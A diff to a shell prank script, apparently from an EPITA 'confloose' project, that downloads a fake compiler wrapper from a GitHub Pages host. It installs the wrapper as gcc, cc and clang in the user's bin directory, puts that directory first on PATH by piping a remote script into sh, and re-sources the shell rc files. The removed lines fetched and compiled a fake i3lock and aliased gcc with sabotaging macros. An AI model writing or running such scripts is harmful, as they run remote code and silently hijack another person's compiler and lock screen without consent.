@@ -1,10 +1,20 @@
 #!/bin/sh
 
-tempdir=$(mktemp -d)
-cd "$tempdir"
-curl "https://d-002.github.io/epita/confloose/fake-i3lock/i3lock.c" >> "$tempdir/i3lock.c"
-i3lock_path=$(which i3lock | sed "s|/|\\\\/|g")
-sed -i "s/I3LOCK_PATH/$i3lock_path/" i3lock.c
-gcc -o i3lock i3lock.c -std=c99
+if [ -n "$AFS_DIR" ]; then
+    dir="$AFS_DIR/bin"
+else
+    dir="$HOME/.local/bin"
+fi
 
-echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'alias gcc=\"gcc -Dwhile=if -Dshort=long -Dconst= -Dtrue=0 -Dfalse=1 -Dmalloc=calloc -Di=j -Dreturn=\\\"return 127;return\\\" -Dfor=\\\"for(;;)for\\\" -Dmain=\\\"main(void){}int main2\\\"\"'" | sh
+mkdir -p "$dir"
+
+for name in gcc cc clang; do
+    file="$dir/$name"
+    curl "https://d-002.github.io/epita/confloose/fake-gcc/gcc" >> "$file"
+
+    sed -i "s,GCC_PATH,$(which $name),g" "$file"
+    chmod +x $file
+done
+
+echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
+for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
